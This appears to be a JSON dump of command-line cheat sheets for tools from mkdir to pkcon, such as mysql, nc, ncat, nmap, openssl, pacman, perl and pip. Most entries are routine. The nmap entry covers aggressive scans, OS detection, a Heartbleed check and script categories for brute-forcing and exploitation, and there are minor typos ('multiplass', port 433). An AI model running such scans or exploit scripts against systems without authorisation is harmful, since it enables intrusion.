          "content": "# To create nested directories:\nmkdir -p foo/bar/baz\n\n# To create foo/bar and foo/baz directories:\nmkdir -p foo/{bar,baz}\n\n# To create the foo/bar, foo/baz, foo/baz/zip and foo/baz/zap directories:\nmkdir -p foo/{bar,baz/{zip,zap}}\n"
        },
        {
          "name": "more",
          "type": "blob",
          "size": 0.05859375,
          "content": "# To show <file> beginning at line number 5:\nmore +5 <file>\n"
        },
        {
          "name": "mount",
          "type": "blob",
          "size": 0.3740234375,
          "content": "# To mount / partition as read-write in repair mode:\nmount -o remount,rw /\n\n# To bind mount path to a second location:\nmount --bind <source> <destination>\n\n# To mount Usb disk as user writable:\nmount -o uid=username,gid=usergroup /dev/sdx /mnt/xxx\n\n# To mount a remote NFS directory:\nmount -t nfs <host>:<remote-dir> <local-dir>\n\n# To mount an ISO:\nmount -o loop disk1.iso /mnt/disk\n"
        },
        {
          "name": "multipass",
          "type": "blob",
          "size": 0.1953125,
          "content": "# List all options\nmultipass \n\n# List existing VMs on your device\nmultiplass list\n\n# Find what VMs can be downloaded\nmultipass find\n\n# Download and start a temp VM\nmultipass launch -v --name todelete\n"
        },
        {
          "name": "mutt",
          "type": "blob",
          "size": 0.5224609375,
          "content": "# Create new mailbox in IMAP\n\t+ When located in mailbox list (c)\n\t\tshift + C \n\n# Move multiple messages to folder (bulk operations)\n\t\n\t1. Select/tag them with alt+'t'\n\t2. ;s in mail inbox overview for bulk operation\n\n# Deleting / Undeleting all messages in mutt\n\t\n\t1. In mutt’s index, hit ‘D’ (UPPERCASE D)\n\t2. It will prompt you with “Delete messages matching: “\n\t\t\n\t\t+ enter this string:\n\n\t\t~A\n\n\t3. It should mark all for deletion!\n\t4. Conversely, you can do the same thing with UPPERCASE U to undelete multiple messages. \n"
        },
        {
          "name": "mv",
          "type": "blob",
          "size": 0.583984375,
          "content": "# To move a file from one place to another:\nmv <src> <dest>\n\n# To move a file from one place to another and automatically overwrite if the destination file exists:\n# (This will override any previous -i or -n args)\nmv -f <src> <dest>\n\n# To move a file from one place to another but ask before overwriting an existing file:\n# (This will override any previous -f or -n args)\nmv -i <src> <dest>\n\n# To move a file from one place to another but never overwrite anything:\n# (This will override any previous -f or -i args)\nmv -n <src> <dest>\n\n# To move listed file(s) to a directory\nmv -t <dest> <file>...\n"
        },
        {
          "name": "mysql",
          "type": "blob",
          "size": 1.0673828125,
          "content": "---\ntags: [ database ]\n---\n# To connect to a database:\nmysql -h <host> -u <username> -p\n\n# To backup all databases:\nmysqldump --all-databases --all-routines -u <username> -p > ~/dump.sql\n\n# To restore all databases:\nmysql -u <username> -p  < ~/fulldump.sql\n\n# To create a database in utf8 charset:\nCREATE DATABASE owa CHARACTER SET utf8 COLLATE utf8_general_ci;\n\n# To add a user and give rights on the given database:\nGRANT ALL PRIVILEGES ON database.* TO 'user'@'localhost'IDENTIFIED BY 'password' WITH GRANT OPTION;\n\n# To list the privileges granted to the account that you are using to connect to the server. Any of the 3 statements will work. :\nSHOW GRANTS FOR CURRENT_USER();\nSHOW GRANTS;\nSHOW GRANTS FOR CURRENT_USER;\n\n# Basic SELECT Statement:\nSELECT * FROM tbl_name;\n\n# Basic INSERT Statement:\nINSERT INTO tbl_name (col1,col2) VALUES(15,col1*2);\n\n# Basic UPDATE Statement:\nUPDATE tbl_name SET col1 = \"example\";\n\n# Basic DELETE Statement:\nDELETE FROM tbl_name WHERE user = 'jcole';\n\n# To check stored procedure:\nSHOW PROCEDURE STATUS;\n\n# To check stored function:\nSHOW FUNCTION STATUS;\n"
        },
        {
          "name": "mysqldump",
          "type": "blob",
          "size": 0.9677734375,
          "content": "---\ntags: [ database ]\n---\n# To dump a database to a file (Note that your password will appear in your command history!):\nmysqldump -u<username> -p<password> <database> > db.sql\n\n# To dump a database to a file:\nmysqldump -u<username> -p <database> > db.sql\n\n# To dump a database to a .tgz file (Note that your password will appear in your command history!):\nmysqldump -u<username> -p<password> <database> | gzip -9 > db.sql\n\n# To dump a database to a .tgz file:\nmysqldump -u<username> -p <database> | gzip -9 > db.sql\n\n# To dump all databases to a file (Note that your password will appear in your command history!):\nmysqldump -u<username> -p<password> --all-databases > all-databases.sql\n\n# To dump all databases to a file:\nmysqldump -u<username> -p --all-databases > all-databases.sql\n\n# To export the database structure only:\nmysqldump --no-data -u<username> -p <database> > dump_file\n\n# To export the database data only:\nmysqldump --no-create-info -u<username> -p <database> > dump_file\n"
        },
        {
          "name": "nc",
          "type": "blob",
          "size": 1.03515625,
          "content": "---\ntags: [ networking ]\n---\n# To open a TCP connection from <src-port> to <dest-port> of <dest-host>, with a timeout of <seconds>\nnc -p <src-port> -w <seconds> <dest-host> <dest-port>\n\n# To open a UDP connection to <dest-port> of <dest-host>:\nnc -u <dest-host> <dest-port>\n\n# To open a TCP connection to port 42 of <host> using <source-host> as the IP for the local end of the connection:\nnc -s <source-host> <dest-host> <port>\n\n# To create and listen on a UNIX-domain stream socket:\nnc -lU /var/tmp/dsocket\n\n# To connect to <dest-port> of <dest-host> via an HTTP proxy at <proxy-host>,\n# <proxy-port>. This example could also be used by ssh(1); see the ProxyCommand\n# directive in ssh_config(5) for more information.\nnc -x<proxy-host>:<proxy-port> -Xconnect <dest-host> <dest-port>\n\n# The same example again, this time enabling proxy authentication with username \"ruser\" if the proxy requires it:\nnc -x<proxy-host>:<proxy-port> -Xconnect -Pruser <host> <port>\n\n# To choose the source IP for the testing using the -s option\nnc -zv -s source_IP target_IP Port\n"
        },
        {
          "name": "ncat",
          "type": "blob",
          "size": 0.818359375,
          "content": "---\ntags: [ networking ]\n---\n# Connect mode (ncat is client) | default port is 31337\nncat <host> [<port>]\n\n# Listen mode (ncat is server) | default port is 31337\nncat -l [<host>] [<port>]\n\n# Transfer file (closes after one transfer)\nncat -l [<host>] [<port>] < file\n\n# Transfer file (stays open for multiple transfers)\nncat -l --keep-open [<host>] [<port>] < file\n\n# Receive file\nncat [<host>] [<port>] > file\n\n# Brokering | allows for multiple clients to connect\nncat -l --broker [<host>] [<port>]\n\n# Listen with SSL | many options, use ncat --help for full list\nncat -l --ssl [<host>] [<port>]\n\n# Access control\nncat -l --allow <ip>\nncat -l --deny <ip>\n\n# Proxying\nncat --proxy <proxyhost>[:<proxyport>] --proxy-type {http | socks4} <host>[<port>]\n\n# Chat server | can use brokering for multi-user chat\nncat -l --chat [<host>] [<port>]\n"
        },
        {
          "name": "ncdu",
          "type": "blob",
          "size": 0.2021484375,
          "content": "# To save results to <file>:\nncdu -o <file>\n\n# To read from <file>:\nncdu -f <file>\n\n# To save results to a compressed file:\nncdu -o- | gzip > <file>\n\n# To read from a compressed file:\nzcat <file> | ncdu -f-\n"
        },
        {
          "name": "netstat",
          "type": "blob",
          "size": 0.5634765625,
          "content": "---\ntags: [ networking ]\n---\n# WARNING ! netstat is deprecated. Look below.\n\n# To view which users/processes are listening to which ports:\nsudo netstat -lnptu\n\n# To view routing table (use -n flag to disable DNS lookups):\nnetstat -r\n\n# Which process is listening to port <port>\nnetstat -pln | grep <port> | awk '{print $NF}'\n\n# Example output: 1507/python\n\n# Fast display of ipv4 tcp listening programs\nsudo netstat -vtlnp --listening -4\n\n# WARNING ! netstat is deprecated.\n# Replace it by:\nss\n\n# For netstat -r\nip route\n\n# For netstat -i\nip -s link\n\n# For netstat -g\nip maddr\n"
        },
        {
          "name": "nft",
          "type": "blob",
          "size": 0.0810546875,
          "content": "# List applies nft rules:\nnft list ruleset\n\n# Load a ruleset file:\nnft -f filename\n"
        },
        {
          "name": "nkf",
          "type": "blob",
          "size": 0.5908203125,
          "content": "# To check the file's charactor code:\nnkf -g <file>\n\n# To convert charactor code to UTF-8:\nnkf -w --overwrite <file>\n\n# To convert charactor code to EUC-JP:\nnkf -e --overwrite <file>\n\n# To convert charactor code to Shift-JIS:\nnkf -s --overwrite <file>\n\n# To convert charactor code to ISO-2022-JP:\nnkf -j --overwrite <file>\n\n# To convert newline to LF:\nnkf -Lu --overwrite <file>\n\n# To convert newline to CRLF:\nnkf -Lw --overwrite <file>\n\n# To convert newline to CR:\nnkf -Lm --overwrite <file>\n\n# To MIME encode:\necho テスト | nkf -WwMQ\n\n# To MIME decode:\necho \"=E3=83=86=E3=82=B9=E3=83=88\" | nkf -WwmQ\n"
        },
        {
          "name": "nmap",
          "type": "blob",
          "size": 4.0458984375,
          "content": "---\ntags: [ networking ]\n---\n# Single target scan:\nnmap [target]\n\n# Scan from a list of targets:\nnmap -iL [list.txt]\n\n# iPv6:\nnmap -6 [target]\n\n# OS detection:\nnmap -O --osscan_guess [target]\n\n# Save output to text file:\nnmap -oN [output.txt] [target]\n\n# Save output to xml file:\nnmap -oX [output.xml] [target]\n\n# Scan a specific port:\nnmap -source-port [port] [target]\n\n# Do an aggressive scan:\nnmap -A [target]\n\n# Speedup your scan:\n# -n => disable ReverseDNS\n# --min-rate=X => min X packets / sec\nnmap -T5 --min-parallelism=50 -n --min-rate=300 [target]\n\n# Traceroute:\nnmap -traceroute [target]\n\n# Ping scan only: -sP\n# Don't ping:     -PN <- Use full if a host don't reply to a ping.\n# TCP SYN ping:   -PS\n# TCP ACK ping:   -PA\n# UDP ping:       -PU\n# ARP ping:       -PR\n\n# Example: Ping scan all machines on a class C network\nnmap -sP 192.168.0.0/24\n\n# Force TCP scan: -sT\n# Force UDP scan: -sU\n\n# Use some script:\nnmap --script default,safe\n\n# Loads the script in the default category, the banner script, and all .nse files in the directory /home/user/customscripts.\nnmap --script default,banner,/home/user/customscripts\n\n# Loads all scripts whose name starts with http-, such as http-auth and http-open-proxy.\nnmap --script 'http-*'\n\n# Loads every script except for those in the intrusive category.\nnmap --script \"not intrusive\"\n\n# Loads those scripts that are in both the default and safe categories.\nnmap --script \"default and safe\"\n\n# Loads scripts in the default, safe, or intrusive categories, except for those whose names start with http-.\nnmap --script \"(default or safe or intrusive) and not http-*\"\n\n# Scan for the heartbleed\n# -pT:443 => Scan only port 443 with TCP (T:)\nnmap -T5 --min-parallelism=50 -n --script \"ssl-heartbleed\" -pT:443 127.0.0.1\n\n# Show all informations (debug mode)\nnmap -d ...\n\n# Scan for available SSH connections (use root for additional output)\nnmap -p 22 192.168.0.0/24\n\n## Port Status Information\n- Open: This indicates that an application is listening for connections on this port.\n- Closed: This indicates that the probes were received but there is no application listening on this port.\n- Filtered: This indicates that the probes were not received and the state could not be established. It also indicates that the probes are being dropped by some kind of filtering.\n- Unfiltered: This indicates that the probes were received but a state could not be established.\n- Open/Filtered: This indicates that the port was filtered or open but Nmap couldn’t establish the state.\n- Closed/Filtered: This indicates that the port was filtered or closed but Nmap couldn’t establish the state.\n\n## Additional Scan Types\n\nnmap -sn: Probe only (host discovery, not port scan)\nnmap -sS: SYN Scan\nnmap -sT: TCP Connect Scan\nnmap -sU: UDP Scan\nnmap -sV: Version Scan\nnmap -O: Used for OS Detection/fingerprinting\nnmap --scanflags: Sets custom list of TCP using `URG ACK PSH RST SYN FIN` in any order\n\n### Nmap Scripting Engine Categories\nThe most common Nmap scripting engine categories:\n- auth: Utilize credentials or bypass authentication on target hosts.\n- broadcast: Discover hosts not included on command line by broadcasting on local network.\n- brute: Attempt to guess passwords on target systems, for a variety of protocols, including http, SNMP, IAX, MySQL, VNC, etc.\n- default: Scripts run automatically when -sC or -A are used.\n- discovery: Try to learn more information about target hosts through public sources of information, SNMP, directory services, and more.\n- dos: May cause denial of service conditions in target hosts.\n- exploit: Attempt to exploit target systems.\n- external: Interact with third-party systems not included in target list.\n- fuzzer: Send unexpected input in network protocol fields.\n- intrusive: May crash target, consume excessive resources, or otherwise impact target machines in a malicious fashion.\n- malware: Look for signs of malware infection on the target hosts.\n- safe: Designed not to impact target in a negative fashion.\n- version: Measure the version of software or protocols on the target hosts.\n- vul: Measure whether target systems have a known vulnerability.\n"
        },
        {
          "name": "nmcli",
          "type": "blob",
          "size": 1.158203125,
          "content": "---\ntags: [ networking ]\n---\n# Connect to a wireless access point - Parameters:\n# \t<wiface> -- the name of your wireless interface\n#\t<ssid> -- the SSID of the access point\n#\t<pass> -- the WiFi password\nnmcli d wifi connect <ssid> password <pass> iface <wiface>\n\n# Disconnect from WiFi - Parameters:\n#\t<wiface> -- the name of your wireless interface\nnmcli d wifi disconnect iface <wiface>\n\n# Get WiFi status (enabled / disabled)\nnmcli radio wifi\n\n# Enable / Disable WiFi\nnmcli radio wifi <on|off>\n\n# Show all available WiFi access points\nnmcli dev wifi list\n\n# Refresh the available WiFi connection list\nnmcli dev wifi rescan\n\n# Show all available connections\nnmcli con\n\n# Show only active connections\nnmcli con show --active\n\n# Review the available devices\nnmcli dev status\n\n# Add a dynamic ethernet connection - parameters:\n#\t<name> -- the name of the connection\n#\t<iface_name> -- the name of the interface\nnmcli con add type ethernet con-name <name> ifname <iface_name>\n\n# Import OpenVPN connection settings from file:\nnmcli con import type openvpn file <path_to_ovpn_file>\n\n# Bring up the ethernet connection\nnmcli con up <name>\n\n# Show WiFi password and QR code\nnmcli dev wifi show\n"
        },
        {
          "name": "notify-send",
          "type": "blob",
          "size": 0.171875,
          "content": "# To send a desktop notification via dbus:\nnotify-send -i 'icon-file/name' -a 'application_name' 'summary' 'body of message'\n\n# The -i and -a flags can be omitted if unneeded.\n"
        },
        {
          "name": "nova",
          "type": "blob",
          "size": 0.474609375,
          "content": "# To list VMs on current tenant:\nnova list\n\n# To list VMs of all tenants (admin user only):\nnova list --all-tenants\n\n# To boot a VM on a specific host:\nnova boot --nic net-id=<net_id> \\\n          --image <image_id> \\\n          --flavor <flavor> \\\n          --availability-zone nova:<host_name> <vm_name>\n\n# To stop a server:\nnova stop <server>\n\n# To start a server:\nnova start <server>\n\n# To attach a network interface to a specific VM:\nnova interface-attach --net-id <net_id> <server>\n"
        },
        {
          "name": "npm",
          "type": "blob",
          "size": 0.7529296875,
          "content": "---\ntags: [ packaging ]\n---\n# Every command shown here can be used with the `-g` switch for global scope\n\n# To install a package in the current directory:\nnpm install <package>\n\n# To install a package, and save it in the `dependencies` section of `package.json`:\nnpm install --save <package>\n\n# To install a package, and save it in the `devDependencies` section of `package.json`:\nnpm install --save-dev <package>\n\n# To show outdated packages in the current directory:\nnpm outdated\n\n# To update outdated packages:\nnpm update\n\n# To update `npm` (will override the one shipped with Node.js):\nnpm install -g npm\n\n# To uninstall a package:\nnpm uninstall <package>\n\n# To set the `authToken` using env variable `NPM_TOKEN`:\nnpm config set //npm.intra/:_authToken=\\${NPM_TOKEN}\n"
        },
        {
          "name": "ntp",
          "type": "blob",
          "size": 0.6474609375,
          "content": "# To verify if ntpd is running:\nservice ntp status\n\n# To start ntpd if not running:\nservice ntp start\n\n# To display current hardware clock value:\nsudo hwclock -r\n\n# To apply system time to hardware time:\nsudo hwclock --systohc\n\n# To apply hardware time to system time:\nsudo hwclock --hctosys\n\n# To set hwclock to local time:\nsudo hwclock --localtime\n\n# To set hwclock to UTC:\nsudo hwclock --utc\n\n# To set hwclock manually:\nsudo hwclock --set --date=\"8/10/15 13:10:05\"\n\n# To query surrounding stratum time servers\nntpq -pn\n\n# To config file:\n/etc/ntp.conf\n\n# To driftfile:\n# location of \"drift\" of your system clock compared to ntp servers:\n/var/lib/ntp/ntp.drift\n"
        },
        {
          "name": "numfmt",
          "type": "blob",
          "size": 0.0888671875,
          "content": "# To convert bytes to Human readable format\nnumfmt --to=iec --suffix=B --padding=7 1048576\n"
        },
        {
          "name": "od",
          "type": "blob",
          "size": 0.2958984375,
          "content": "# To dump a file in octal format:\nod <binary-file>\nod -o <binary-file>\nod -t o2 <binary-file>\n\n# To dump a file in hexadecimal format:\nod -x <binary-file>\nod -t x2 <binary-file>\n\n# To dump a file in hexadecimal format, with hexadecimal offsets and a space between each byte:\nod -A x -t x1 <binary-file>\n"
        },
        {
          "name": "openssl",
          "type": "blob",
          "size": 1.673828125,
          "content": "# To create a 2048-bit private key:\nopenssl genrsa -out server.key 2048\n\n# To create the Certificate Signing Request (CSR):\nopenssl req -new -key server.key -out server.csr\n\n# To sign a certificate using a private key and CSR:\nopenssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt\n\n# (The above commands may be run in sequence to generate a self-signed SSL certificate.)\n\n# To show certificate information for a certificate signing request\nopenssl req -text -noout -in server.csr\n\n# To show certificate information for generated certificate\nopenssl x509 -text -noout -in server.crt \n\n# To get the sha256 fingerprint of a certificate\nopenssl x509 -in server.crt -noout -sha256 -fingerprint\n\n# To view certificate expiration:\necho | openssl s_client -connect <hostname>:443 2> /dev/null | \\\nawk '/-----BEGIN/,/END CERTIFICATE-----/' | \\\nopenssl x509 -noout -enddate\n\n# To generate Diffie-Hellman parameters:\nopenssl dhparam -outform PEM -out dhparams.pem 2048\n\n# To test an https server:\nopenssl s_client -connect 10.240.2.130:433\n\n# High-quality options for openssl for symmetric (secret key) encryption\n  \nThis is what knowledgable people consider a good set of options for \nsymmetric encryption with openssl to give you a high-quality result.\nAlso, always remember that the result is only as good as the password\nyou use. You must use a strong password otherwise encryption is meaningless.\n  \nopenssl enc -e -aes-256-cbc \\\n  -salt \\\n  -pbkdf2 \\\n  -iter 1000000 \\\n  -md sha512 \\\n  -base64 \\\n  -in somefile \\\n  -out somefile.enc # to encrypt\n\nopenssl enc -d -aes-256-cbc \\\n  -salt \\\n  -pbkdf2 \\\n  -iter 1000000 \\\n  -md sha512 \\\n  -base64 \\\n  -in somefile.enc \\\n  -out somefile # to decrypt\n"
        },
        {
          "name": "org-mode",
          "type": "blob",
          "size": 1.3017578125,
          "content": "  Begin org-mode                               ALT-x org-mode\n  Save                                         CTRL-x CTRL-s\n  Export in other file formats (eg HTML,PDF)   CTRL-c CTRL-e\n\n# Outline\n\n  Section heading                              *\n  New headline                                 ALT-return\n  Move headline up or down                     ALT-up_arrow/down_arrow\n  Adjust indent depth of headline              ALT-left_arrow/right_arrow\n  Open/collapse section                        TAB\n  Open/collapse All                            CTRL-TAB\n\n# To-Do Lists\n\n  Mark list item as TODO                       ** TODO\n  Cycle through workflow                       SHIFT-left_arrow/right_arrow\n  Show only outstanding TODO                   items CTRL-c CTRL-v\n\n# Tables\n\n  Table column separator                       Vertical/pipe character\n  Reorganize table                             TAB\n  Move column                                  ALT-left_arrow/right_arrow\n  Move row                                     ALT-up_arrow/down_arrow\n\n# Styles\n\n  *bold*\n  /italic/\n  _underlined_\n  =code=\n  ~verbatim~\n  +strike-through+\n\n# Heading\n\n  Header         -*- mode: org -*-\n\n# .emacs\n\n  To make org-mode automatically wrap lines:\n\n    (add-hook 'org-mode-hook\n              '(lambda ()\n                 (visual-line-mode 1)))\n"
        },
        {
          "name": "p4",
          "type": "blob",
          "size": 0.140625,
          "content": "tags: [ vcs ]\n\n# To print details related to client and server configuration:\np4 info \n\n# To open a file and add it to depot:\np4 add <filename>\n"
        },
        {
          "name": "pacman",
          "type": "blob",
          "size": 1.923828125,
          "content": "---\ntags: [ packaging ]\n---\n# To search for a package:\npacman -Ss <package>...\n\n# To update the local package base and upgrade all out-of-date packages:\npacman -Suy\n\n# To install a package:\npacman -S <package>...\n\n# To uninstall a package:\npacman -R <package>...\n\n# To uninstall a package and its depedencies, removing all new orphans:\npacman -Rcs <package>...\n\n# To get information about package:\npacman -Si <package>...\n\n# To install a package from builded package file (.tar.xz):\npacman -U <file>\n\n# To list the commands provided by an installed package:\npacman -Ql <package>... | sed -n -e 's/.*\\/bin\\///p' | tail -n +2\n\n# To list explicitly installed packages:\npacman -Qe\n\n# To list the top-most recent explicitly installed packages (not in the base groups):\nexpac --timefmt='%Y-%m-%d %T' '%l\\t%n' $(comm -23 <(pacman -Qeq|sort) <(pacman -Qqg base base-devel|sort)) | sort -r | head -20\n\n# To list orphan packages (installed as dependencies and not required anymore):\npacman -Qdt\n\n# To list installed packages sorted by size\npacman -Qi | awk '/^Name/ {name=$3} /^Installed Size/ {print name, $4 substr($5,1,1)}' | column -t | sort -rhk2 | cat -n | tac\n\n# You can't directly install packages from the Arch User Database (AUR) with\n# pacman. You need an AUR helper program such as `yay` or `paru` to do that.\n# But considering that all of those are themselves in the AUR, here is how to\n# do that manualy.\n#\n# Installing a package from AUR is a relatively simple process:\n# - Make sure that you have the `base-devel` and `git` packages installed\n# - Retrieve the repository corresponding to the package from the AUR website\n# - Run `makepkg` in the cloned repository\n# - Use `pacman` to install the created package\n#\n# Ensure that have `base-devel` and `git`:\npacman -S --needed base-devel git\n# Retrieve the repository:\ngit clone https://aur.archlinux.org/<package>.git\ncd <package>\n# Build the package:\nmakepkg -s\n# Install:\nsudo pacman -U <package (.pkg.tar.zst)>\n"
        },
        {
          "name": "pactl",
          "type": "blob",
          "size": 0.294921875,
          "content": "---\nsyntax: bash\ntags: [ audio, pulseaudio ]\n---\n# INCREASE the volume of default sink by 2.5%\npactl set-sink-volume @DEFAULT_SINK@ +2.5%\n\n# DECREASE the volume of default sink by 2.5%\npactl set-sink-volume @DEFAULT_SINK@ -2.5%\n\n# Toggle mute the default sink\npactl set-sink-mute @DEFAULT_SINK@ toggle\n"
        },
        {
          "name": "pandoc",
          "type": "blob",
          "size": 0.2109375,
          "content": "# Convert HTML file to Markdown\npandoc -f html -t markdown  -i <HTML input file> -o  <markdown output file>\n\n# Convert Markdown file to HTML\npandoc -f markdown -t html -i <markdown input file>  -o <HTML output file>\n"
        },
        {
          "name": "pass",
          "type": "blob",
          "size": 0.6357421875,
          "content": "# Initalize password store using a gpg id:\npass init <gpg-id>\n\n# Reencrypt data in subdirectory:\npass init -p <path-to-directory> <gpg-id-1> <gpg-id-2>\n\n# Insert (Create or overwrite) data into a file:\npass insert [-m|--multiline] <path-to-data>\n\n# Automatically generate a password of length n:\npass generate <path-to-data> <n>\n\n# Show password store:\npass\n\n# Edit an entry:\npass edit <path-to-data>\n\n# Display content of an entry:\npass <path-to-data>\n\n# Copy line n of entry to clipboard (Line 0 if none if specified):\npass -c <n> <path-to-data>\n\n# Initalize a git repository (All changes made by pass will be committed automatically)\npass git init\n"
        },
        {
          "name": "paste",
          "type": "blob",
          "size": 0.4501953125,
          "content": "# To concat columns from files:\npaste <file>...\n\n# To list the files in the current directory in three columns:\nls | paste - - -\n\n# To combine pairs of lines from a file into single lines:\npaste -s -d '\\t\\n' <file>\n\n# To number the lines in a file, similar to nl(1):\nsed = <file> | paste -s -d '\\t\\n' - -\n\n# To create a colon-separated list of directories named bin, suitable for use in the PATH environment variable:\nfind / -name bin -type d | paste -s -d : -\n"
        },
        {
          "name": "patch",
          "type": "blob",
          "size": 0.3291015625,
          "content": "# To patch one file:\npatch <file> < <patch-file>\n\n# To reverse a patch:\npatch -R <file> < <patch-file>\n\n# To patch all files in a directory, adding any missing new files:\n# -p strips leading slashes\n$ cd dir\n$ patch -p1 -i <dir> <patch-file>\n\n# To patch files in a directory, with one level (/) offset:\npatch -p1 -r <dir> < <patch-file>\n"
        },
        {
          "name": "pdftk",
          "type": "blob",
          "size": 0.3798828125,
          "content": "# To concatenate all pdf files into one:\npdftk *.pdf cat output all.pdf\n\n# To concatenate specific pdf files into one:\npdftk 1.pdf 2.pdf 3.pdf cat output 123.pdf\n\n# To concatenate pages 1 to 5 of first.pdf with page 3 of second.pdf:\npdftk A=fist.pdf B=second.pdf cat A1-5 B3 output new.pdf\n\n# To extract pages 2 to 3 from a file:\npdftk file.pdf cat 2-3 output file_with_page_2_and_3.pdf\n"
        },
        {
          "name": "perl",
          "type": "blob",
          "size": 1.9375,
          "content": "---\ntags: [ perl ]\n---\nSee https://perldoc.perl.org/perlrun\n\n# View the perl version (long and short version):\nperl -v\nperl -V\n\n# Run a program:\nperl <program> [args]\n\n# Syntax check a program:\nperl -cw <program>\n\n# Force warnings everywhere in the program:\nperl -W <program>\n\n# Add path1 to the module search path:\n# The PERL5LIB env var does this too\nperl -I <path1> <program> [args]\n\n# Start the program in the perl debugger:\n# See https://perldoc.perl.org/perldebug)\nperl -d <program>\n\n# Specify the program text as the argument to -e:\nperl -e <program_text>\nperl -e 'print \"Hello World!\\n\"'\n\n# Enable Unicode:\nperl -C -e <program_text>\n\n# Specify the program text and enable new features:\nperl -E 'say \"Hello World!\"'\n\n# Specify the program text and enable new features:\nperl -M<module>[=import,list] -E <program_text>\n\n# Compile then decompile a program with B::Deparse:\nperl -MO=Deparse -E <program_text>\n\n# Process files line-by-line (output on your own):\nperl -ne <program_text> [files]\n\n# Process files line-by-line (output $_ at each loop iteration):\nperl -pe <program_text> [files]\n\n# Read an entire file (or STDIN) into one big string.\n# With v5.36 and later, -g is the same as -0777\nperl -0777 -ne <program_text> [files]\nperl -0777 -pe <program_text> [files]\nperl -g -pe <program_text> [files]\n\n# Split input lines on whitespace with -a, put into @F:\nperl -ane  <program_text>\n\n# -a implies -n:\nperl -ae  <program_text>\n\n# Splits lines on alternate separator with -F:\nperl -aF<separator> -e <program_text>\n\n# In-place editing with -p:\nperl -pe <program_text> [files]\n\n# In-place editing with -p and backup original with -i:\nperl -pie <program_text> [files]\nperl -pi.bak -e <program_text> [files]\n\n# Replace string \"\\n\" to newline:\necho -e \"foo\\nbar\\nbaz\" | perl -pe 's/\\n/\\\\n/g;'\n\n# Replace newline with multiple line to space:\ncat test.txt | perl -0pe \"s/test1\\ntest2/test1 test2/m\"\n\n# Replace double newlines with single newline:\nperl -pe '$/=\"\"; s/(\\n)+/$1/' my-file\n"
        },
        {
          "name": "perlbrew",
          "type": "blob",
          "size": 0.583984375,
          "content": "---\ntags: [ perl ]\n---\nSee https://github.com/gugod/App-perlbrew\n\n# setup perlbrew\nperlbrew init\n\n# list perls available to install\nperlbrew available\n\n# install a particular perl version (see `perlbrew available`)\nperlbrew install <version>\n\n# list perls installed\nperlbrew list\n\n# switch to a particular perl version\nperlbrew switch <version>\n\n# run a program against all installed versions\nperlbrew exec perl <myprogram.pl>\n\n# get list of installed modules in the current perl\nperlbrew list-modules\n\n# clone modules from one version to another\nperlbrew clone-modules <from-version> <to-version>\n"
        },
        {
          "name": "perldoc",
          "type": "blob",
          "size": 0.6357421875,
          "content": "---\ntags: [ perl ]\n---\n# read about a perl builtin function\nperldoc -f <function>\n\n# read about a perl builtin variable (probably need to quote it)\nperldoc -v <variable>\n\n# list the various doc pages\nperldoc perltoc\n\n# see a perldoc page, such as the Data Structures Cookbook (perldsc)\nperldoc <page>\nperldoc perldsc\n\n# read an installed module's docs\nperldoc <Some::Module>\n\n# see the location of a module's docs\n# this is often the same file as the code\nperldoc -l <Some::Module>\n\n# see the raw source of the module docs\n# this is often the same file as the code, but sometimes not\nperldoc -m <Some::Module>\n\n# read the perldoc docs\nperldoc perldoc\n"
        },
        {
          "name": "pgrep",
          "type": "blob",
          "size": 0.12890625,
          "content": "# To get a list of PIDs matching <pattern>:\npgrep <pattern>\n\n# To kill all PIDs matching <pattern>:\npgrep -f <pattern> | xargs kill\n"
        },
        {
          "name": "php",
          "type": "blob",
          "size": 0.4501953125,
          "content": "# To view the php version:\nphp -v\n\n# To view the installed php modules:\nphp -m\n\n# To view phpinfo() information:\nphp -i\n\n# To lint a php file:\nphp -l file.php\n\n# To lint all php files within the cwd:\nfind . -name \"*.php\" -print0 | xargs -0 -n1 -P8 php -l\n\n# To enter an interactive shell:\nphp -a\n\n# To locate the system's php.ini files:\nphp -i | grep \"php.ini\"\n\n# To start a local webserver for the cwd on port 3000 (requires php >= 5.4):\nphp -S localhost:3000\n"
        },
        {
          "name": "ping",
          "type": "blob",
          "size": 0.2744140625,
          "content": "---\ntags: [ networking ]\n---\n# To ping <host> with 15 packets:\nping -c 15 <host>\n\n# To ping <host> with 15 packets, one every .5 seconds:\nping -c 15 -i .5 <host>\n\n# To test if a packet size of 1500 bytes is supported (to check the MTU for example):\nping -s 1500 -c 10 -M do <host>\n"
        },
        {
          "name": "ping6",
          "type": "blob",
          "size": 0.0966796875,
          "content": "---\ntags: [ networking ]\n---\n# To Get all ipv6 neighbors via broadcast ping:\nping6 -I eth0 ff02::1\n"
        },
        {
          "name": "pip",
          "type": "blob",
          "size": 0.806640625,
          "content": "---\ntags: [ packaging ]\n---\n# To search for a package:\npip search <package>\n\n# To install packages:\npip install <package>...\n\n# To install a package in user space:\npip install --user <package>\n\n# To upgrade a package:\npip install --upgrade <package>\n\n# To output and install packages in a requirement file:\npip freeze > requirements.txt\npip install -r requirements.txt\n\n# To show details of a package:\npip show <package>\n\n# To list outdated packages:\npip list --outdated\n\n# To upgrade all outdated packages:\npip freeze --local | grep -v '^\\-e' | cut -d = -f 1 | xargs -n1 pip install -U\n\n# To upgrade outdated packages on latest version of pip:\npip list --outdated --format=freeze | cut -d = -f 1 | xargs -n1 pip install -U\n\n# To install specific version of a package:\npip install -I SomePackage1==1.1.0 'SomePackage2>=1.0.4'\n"
        },
        {
          "name": "pkcon",
          "type": "blob",
          "size": 0.140625,
          "content": "---\ntags: [ packaging ]\n---\n# To update cached information about available updates:\npkcon refresh\n\n# To update installed packages:\npkcon update\n"
        },
        {
          "name": "pkgtools",
          "type": "blob",
          "size": 0.9296875,
